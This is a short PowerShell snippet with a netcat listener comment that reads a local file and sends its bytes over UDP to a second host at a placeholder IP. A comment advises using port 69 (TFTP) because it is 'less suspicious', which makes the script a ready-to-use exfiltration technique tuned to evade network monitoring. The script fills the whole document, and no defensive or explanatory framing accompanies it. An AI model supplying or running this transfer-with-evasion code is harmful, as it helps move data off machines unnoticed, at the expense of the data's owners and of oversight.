$udpClient = New-Object System.Net.Sockets.UdpClient
$ip = [System.Net.IPAddress]::Parse("192.168.1.5")  # Replace with your Linux IP
$filePath = "C:\path\to\your\file.txt"
$data = [System.IO.File]::ReadAllBytes($filePath)
$udpClient.Send($data, $data.Length, $ip, 69) # Try using a less suspicious port (TFTP)
$udpClient.Close()

# On linux machine just netcat the input to a file
# nc -u -l -p 69 > received_file
